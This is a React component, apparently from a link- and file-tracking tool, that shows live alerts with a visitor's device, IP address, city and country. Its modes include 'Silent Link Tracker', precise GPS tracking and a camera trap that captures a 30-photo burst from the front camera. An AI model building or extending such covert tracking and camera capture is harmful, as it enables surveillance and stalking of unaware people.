import React, { useEffect } from 'react';
import {
  Camera,
  FileText,
  Crosshair,
  Radio,
  Smartphone,
  Laptop,
  Monitor,
  Globe,
  X,
  Eye,
  BellRing,
  ArrowRight,
  ArrowLeft,
} from 'lucide-react';
import { VisitRecord } from '../types';
import { Language } from '../translations';

export interface LiveDeviceAlertToastProps {
  visits: VisitRecord[];
  lang: Language;
  onDismiss: (visitId: string) => void;
  onViewDetails: (visit: VisitRecord) => void;
}

export const LiveDeviceAlertToast: React.FC<LiveDeviceAlertToastProps> = ({
  visits,
  lang,
  onDismiss,
  onViewDetails,
}) => {
  if (!visits || visits.length === 0) return null;

  const isAr = lang === 'ar';
  const ArrowIcon = isAr ? ArrowLeft : ArrowRight;

  return (
    <div
      id="live-device-alert-toast-container"
      className="fixed top-4 right-3 sm:right-6 z-50 flex flex-col gap-2.5 max-w-sm sm:max-w-md w-full pointer-events-none"
      dir={isAr ? 'rtl' : 'ltr'}
    >
      {visits.map((visit) => {
        const mode = visit.mode || 'camera';
        const isCamera = mode === 'camera';
        const isPdf = mode === 'pdf';
        const isPrecise = mode === 'precise';

        const sectionName = isCamera
          ? isAr
            ? 'قسم فخ الكاميرا والبث المباشر'
            : 'Camera Trap & Live Stream'
          : isPdf
          ? isAr
            ? 'قسم ملف الـ PDF التتبعي'
            : 'Canary PDF File Tracker'
          : isPrecise
          ? isAr
            ? 'قسم تتبع GPS الدقيق'
            : 'High-Precision GPS Tracker'
          : isAr
          ? 'قسم التتبع الصامت للرابط'
          : 'Silent Link Tracker';

        const SectionIcon = isCamera
          ? Camera
          : isPdf
          ? FileText
          : isPrecise
          ? Crosshair
          : Radio;

        const badgeColor = isCamera
          ? 'bg-rose-500/10 text-rose-400 border-rose-500/20'
          : isPdf
          ? 'bg-amber-500/10 text-amber-400 border-amber-500/20'
          : isPrecise
          ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20'
          : 'bg-indigo-500/10 text-indigo-400 border-indigo-500/20';

        const isMobile =
          visit.os?.toLowerCase().includes('ios') ||
          visit.os?.toLowerCase().includes('android') ||
          visit.device?.toLowerCase().includes('mobile');

        const DeviceIcon = isMobile ? Smartphone : Laptop;

        return (
          <div
            key={visit.id}
            id={`device-alert-card-${visit.id}`}
            className="pointer-events-auto bg-slate-950/95 text-slate-100 backdrop-blur-md rounded-2xl border border-rose-500/40 shadow-2xl p-3.5 sm:p-4 transition-all animate-in slide-in-from-top-3 duration-300 flex flex-col gap-2.5 ring-1 ring-white/10"
          >
            {/* Header: Section badge & close */}
            <div className="flex items-center justify-between gap-2">
              <div className="flex items-center gap-2">
                <span className="relative flex h-2.5 w-2.5">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-rose-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-rose-500"></span>
                </span>
                <span
                  className={`inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full text-xs font-semibold border ${badgeColor}`}
                >
                  <SectionIcon className="w-3.5 h-3.5" />
                  <span>{sectionName}</span>
                </span>
              </div>

              <button
                type="button"
                onClick={() => onDismiss(visit.id)}
                className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-white/10 transition-colors"
                aria-label="Dismiss"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Device and Location info */}
            <div className="flex items-start gap-3 bg-white/5 rounded-xl p-2.5 border border-white/5">
              <div className="p-2 rounded-lg bg-rose-500/10 text-rose-400 shrink-0">
                <DeviceIcon className="w-5 h-5" />
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-center justify-between gap-1">
                  <h4 className="text-xs sm:text-sm font-bold text-white truncate">
                    {visit.device || (isAr ? 'جهاز غير معروف' : 'Unknown Device')}{' '}
                    <span className="text-slate-400 text-xs font-normal">
                      ({visit.os || 'OS'})
                    </span>
                  </h4>
                  <span className="text-[10px] text-rose-400 font-mono font-medium shrink-0">
                    {isAr ? 'متصل الآن' : 'Connected'}
                  </span>
                </div>

                <div className="flex items-center gap-2 text-xs text-slate-300 mt-1 truncate">
                  <span className="font-mono text-slate-200">{visit.ip}</span>
                  {(visit.city || visit.country) && (
                    <>
                      <span className="text-slate-500">•</span>
                      <span className="inline-flex items-center gap-1 text-slate-300 truncate">
                        <Globe className="w-3 h-3 text-slate-400 shrink-0" />
                        <span className="truncate">
                          {[visit.city, visit.country].filter(Boolean).join(', ')}
                        </span>
                      </span>
                    </>
                  )}
                </div>

                {/* Camera / Stream indicator if active */}
                {isCamera && (
                  <div className="flex items-center gap-1.5 mt-2 text-[11px] text-rose-300 font-medium">
                    <Camera className="w-3.5 h-3.5 text-rose-400 animate-pulse" />
                    <span>
                      {isAr
                        ? 'جارٍ التقاط 30 صورة متتالية من الكاميرا الأمامية'
                        : 'Capturing 30-photo burst from front camera'}
                    </span>
                  </div>
                )}
              </div>
            </div>

            {/* Action buttons */}
            <div className="flex items-center justify-between gap-2 pt-0.5">
              <button
                type="button"
                id={`btn-view-alert-details-${visit.id}`}
                onClick={() => onViewDetails(visit)}
                className="flex-1 inline-flex items-center justify-center gap-2 px-3 py-2 rounded-xl bg-gradient-to-r from-rose-600 to-rose-700 hover:from-rose-500 hover:to-rose-600 text-white text-xs font-bold shadow-lg shadow-rose-900/30 transition-all active:scale-95"
              >
                <Eye className="w-3.5 h-3.5" />
                <span>
                  {isAr
                    ? 'عرض تفاصيل الجهاز والكاميرا فوراً'
                    : 'View Device Details & Camera Now'}
                </span>
                <ArrowIcon className="w-3.5 h-3.5" />
              </button>
            </div>
          </div>
        );
      })}
    </div>
  );
};
